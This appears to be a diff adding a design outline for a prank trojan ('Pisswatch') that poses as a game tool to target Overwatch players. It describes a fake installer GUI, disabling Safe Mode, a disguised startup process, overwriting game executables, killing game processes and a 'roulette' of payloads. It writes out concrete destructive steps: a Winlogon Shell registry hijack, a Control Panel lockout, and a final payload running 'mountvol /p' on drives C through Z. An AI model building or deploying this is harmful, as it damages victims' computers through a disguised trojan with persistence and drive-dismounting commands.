@@ -1,0 +1,78 @@
+Main
+Copy data to C:\Blah
+Data: Annoy1.wav~Annoy10.wav, noise.wav, navashieldlalala.wav, navashieldticktock.wav, navashieldlaugh.wav, axii.exe, aard.exe, shutup.exe, louder.exe, earrape.exe, earrape2.exe, annoy.exe, crash.exe (NotMyFault.exe, myfault.sys), quen.exe, igni.exe(welcomer.ahk), flasher.exe(splashtext.ahk), flood.exe(floodit.cmd), waste.exe(folderbomb.cmd)
+Annoy1~10.wav: Annoying high pitched noise clips, ~5s
+navashield*.wav: Straight from Nava Shield, clock ticking sound, La la la, laugh clip, ~10s
+
+Open fake GUI
+Ask for path to game and launcher
+Write it to registry (HKCU\Software\Blizzad\PathGame) and (HKCU\Software\Blizzad\PathLauncher)
+Write to registry HKCU\TimeDate\IsBootTwice = 0
+Disable Safe Mode
+Show fake error
+Add to startup process (pwsvc.exe, it's actually Pisswatch)
+Start slowing computer down
+Close
+
+Reboot
+pwsvc starts
+Write to registry HKCU\TimeDate\IsBootTwice = 1
+Start Pisswatch routine
+Patch game files (under same name, but they're in fact link file pointing to the third payload)
+Stop launcher and game from starting
+Overwrite game executables with nothing but good old EICAR test file
+Write to registry (HKCU\TimeDate\IsGamePatched = 1) and (HKCU\TimeDate\IsLauncherPatched = 1)
+If process "Overwatch.exe", "Overwatch Launcher.exe", "Battle.net Launcher.exe" or "Battle.net.exe", kill process and display error
+Start Roulette
+Roulette - 32-ish payloads
+DllCall("SystemParametersInfo", UInt, 0x14, UInt, 0, Str, A_WinDir . "\rekt.bmp", UInt, 1)
+EXIT 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell = C:\Windows\system32\exploder.exe
+EXIT
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel(DWORD) = 1
+
+Last payload:
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+mountvol C:\ /p
+mountvol D:\ /p
+mountvol E:\ /p
+mountvol F:\ /p
+mountvol G:\ /p
+mountvol H:\ /p
+mountvol I:\ /p
+mountvol J:\ /p
+mountvol K:\ /p
+mountvol L:\ /p
+mountvol M:\ /p
+mountvol N:\ /p
+mountvol O:\ /p
+mountvol P:\ /p
+mountvol Q:\ /p
+mountvol R:\ /p
+mountvol S:\ /p
+mountvol T:\ /p
+mountvol U:\ /p
+mountvol V:\ /p
+mountvol W:\ /p
+mountvol X:\ /p
+mountvol Y:\ /p
+mountvol Z:\ /p
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
+EXIT
